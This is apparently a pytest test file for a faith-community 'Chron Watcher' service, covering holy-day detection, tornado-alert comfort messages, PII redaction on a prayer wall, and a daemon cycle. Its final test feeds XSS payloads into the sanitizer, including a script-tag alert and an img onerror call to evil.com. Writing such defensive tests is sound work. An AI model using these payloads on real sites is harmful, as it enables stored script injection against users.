"""test_rt_chron_watcher.py — Validation for Fellowship Observer & Chron Watcher.

Tests:
1. Liturgical & Holy Day Calendar horizon detection.
2. Regional alert detection and compassionate comfort dispatch messaging.
3. Strict PII sanitization (phone, email, street addresses) for community prayer wall.
4. Autonomous daemon run_once execution cycle.
"""
from __future__ import annotations

import datetime
import pytest
import rt_chron_watcher


def test_holy_days_calendar_detection():
    # Test with known fixed date: Dec 24 (Christmas Eve)
    test_date = datetime.date(2026, 12, 24)
    upcoming = rt_chron_watcher.get_active_or_upcoming_holy_days(test_date, horizon_days=3)
    
    assert len(upcoming) >= 1
    christmas = next((h for h in upcoming if "Christmas" in h["name"]), None)
    assert christmas is not None
    assert christmas["days_until"] == 1
    assert christmas["is_today"] is False

    # Test exact day match: Dec 25
    test_day_of = datetime.date(2026, 12, 25)
    today_events = rt_chron_watcher.get_active_or_upcoming_holy_days(test_day_of, horizon_days=0)
    assert any(h["is_today"] is True for h in today_events)


def test_regional_alerts_and_comfort_dispatch():
    alerts = rt_chron_watcher.check_regional_alerts(["oklahoma"])
    assert len(alerts) == 1
    alert = alerts[0]
    assert alert["region"] == "Oklahoma"
    assert "Tornado" in alert["event"]
    assert "fellowship is lifting you" in alert["dispatch_message"]
    assert "Are you safe?" in alert["dispatch_message"]


def test_strict_pii_sanitization_for_prayer_wall():
    raw_with_pii = (
        "Please pray for John at 555-123-4567 or john.doe@email.com living at "
        "123 Sacred Mountain Road who is having heart surgery tomorrow."
    )
    sanitized = rt_chron_watcher.sanitize_intention_for_circle(raw_with_pii)
    
    assert "555-123-4567" not in sanitized
    assert "john.doe@email.com" not in sanitized
    assert "123 Sacred Mountain Road" not in sanitized
    assert "[private phone]" in sanitized
    assert "[private email]" in sanitized
    assert "[private location]" in sanitized
    assert "heart surgery tomorrow" in sanitized


def test_aggregate_fellowship_intentions():
    intentions = rt_chron_watcher.aggregate_fellowship_intentions()
    assert len(intentions) >= 4
    for item in intentions:
        assert item["sanitized"] is True
        assert item["text"]
        assert item["tradition"]


@pytest.mark.asyncio
async def test_daemon_run_once_cycle():
    daemon = rt_chron_watcher.ChronWatcherDaemon(interval_sec=900)
    summary = await daemon.run_once(regions=["oklahoma", "houston"])
    
    assert summary["status"] == "ok"
    assert "timestamp" in summary
    assert "holy_days" in summary
    assert summary["active_alerts_count"] >= 2
    assert summary["intentions_aggregated"] >= 4


def test_xss_and_html_injection_sanitization():
    """Verify that malicious script and HTML tags are completely neutralized to prevent Stored XSS."""
    # 1. Script injection
    malicious_script = "<script>alert('xss');</script>Please pray for peace."
    sanitized = rt_chron_watcher.sanitize_intention_for_circle(malicious_script)
    assert "<script>" not in sanitized
    assert "</script>" not in sanitized
    assert "alert('xss');" not in sanitized
    assert "Please pray for peace." in sanitized

    # 2. Image onerror / tag injection
    malicious_img = "<img src=x onerror=fetch('http://evil.com')>Blessings on my family."
    sanitized_img = rt_chron_watcher.sanitize_intention_for_circle(malicious_img)
    assert "<img" not in sanitized_img
    assert "onerror" not in sanitized_img
    assert "Blessings on my family." in sanitized_img

    # 3. Angle brackets and control characters
    malicious_bracket = "May peace be with us: 2 < 3 and 5 > 4.\x00\x1f"
    sanitized_bracket = rt_chron_watcher.sanitize_intention_for_circle(malicious_bracket)
    assert "<" not in sanitized_bracket
    assert ">" not in sanitized_bracket
    assert "\x00" not in sanitized_bracket
    assert "May peace be with us: 2 3 and 5 4." in sanitized_bracket
